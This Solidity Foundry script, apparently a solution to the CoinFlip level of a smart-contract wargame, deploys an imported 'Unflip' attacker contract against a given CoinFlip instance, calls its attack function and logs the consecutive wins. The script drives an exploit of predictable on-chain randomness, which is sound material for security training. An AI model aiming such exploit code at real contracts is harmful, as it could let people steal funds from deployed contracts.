// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Unflip} from "../src/3_CoinFlip.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
}

contract PoC is Script {
    ICoinFlip coinflip = ICoinFlip(0xb721D5C58B4B2d7Fc82084541C639A6b6E3CBf73); // Replace with your CoinFlip instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        Unflip unflip = new Unflip(address(coinflip));
        unflip.attack();

        console2.log("Consecutive Wins: ", coinflip.consecutiveWins());
        vm.stopBroadcast();
    }
}
